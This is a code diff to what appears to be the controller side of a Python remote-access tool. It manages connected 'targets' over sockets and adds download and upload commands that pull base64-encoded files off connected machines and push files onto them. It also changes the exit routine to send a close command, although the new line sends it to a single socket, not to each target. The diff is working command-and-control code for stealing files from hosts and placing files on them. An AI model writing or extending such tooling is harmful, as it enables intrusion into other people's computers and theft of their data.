@@ -64,6 +64,23 @@ while True:
                         targets.remove(target_socket)
                         ips.remove(target_ip)
                         break
+                    elif cmd[:8] == "download":
+                        file_data = utils.receive_frame(target_socket)
+                        if file_data == "DOWNLOAD_FAIL":
+                            print("Download Failed")
+                        else:
+                            with open(cmd[9:],"wb") as f:
+                                f.write(base64.b64decode(file_data))
+                    elif cmd[:6] == "upload":
+                        try:
+                            with open(cmd[7:],"rb") as f:
+                                file_to_upload = f.read()
+                                encoded_file = base64.b64encode(file_to_upload)
+                                utils.reliable_send(target_socket, encoded_file.decode("utf-8"))
+                        except Exception as e:
+                            print(e)
+                            failed = "UPLOAD_FAIL"
+                            utils.reliable_send(target_socket, failed)
                 except Exception as e:
                     print(str(e))
 
@@ -84,6 +101,7 @@ while True:
         print(utils.help_message)
     if command == "exit":
         for target in targets:
+            utils.reliable_send(target_socket, "close")
             target.close()
         s.close()
         stop_threads = True
